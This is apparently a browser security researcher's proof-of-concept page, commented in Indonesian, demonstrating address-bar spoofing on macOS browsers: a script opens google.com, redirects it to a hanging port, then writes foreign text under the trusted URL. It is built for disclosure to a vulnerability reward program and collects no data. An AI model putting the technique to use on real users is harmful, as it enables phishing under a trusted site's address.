<!-- 26 - dua langkah: buka asli lalu gantung   [address-bar spoofing | macOS: Dia/Arc/Chrome/Safari macOS]
     MEKANISME : bilah lebih dulu memperoleh URL tepercaya dari navigasi ASLI, baru sesudah itu dokumen ditukar lewat navigasi menggantung.
     PREDIKAT  : bilah tepercaya bertahan sementara isi sudah bukan milik host itu.
     AMAN      : pergantian dokumen selalu diikuti pergantian bilah.
     ETIKA     : browser & mesin sendiri. Nol form, nol kredensial, nol fetch/beacon, nol resource luar.
                 "www.google.com" = label tak-berbahaya; example.com = origin uji (IANA reserved).
                 Berhenti di predikat -> screenshot -> lapor VRP. Bukan kit phishing. -->
<meta charset="utf-8"><title>26 dua langkah: buka asli lalu gantung</title>
<button onclick="go()" style="font:16px system-ui;padding:12px 22px">RUN</button>
<p id="o" style="font:12px ui-monospace,monospace;color:#555"></p>
<script>
o.textContent='REAL: '+location.origin;
function go(){var w=window.open('https://www.google.com/','x');setTimeout(function(){try{w.location.replace('https://www.google.com:9090/');}catch(e){}},1500);setTimeout(function(){try{w.document.write('<h3>BUKAN google.com - '+location.origin+'</h3>');}catch(e){}},1800);}
</script>
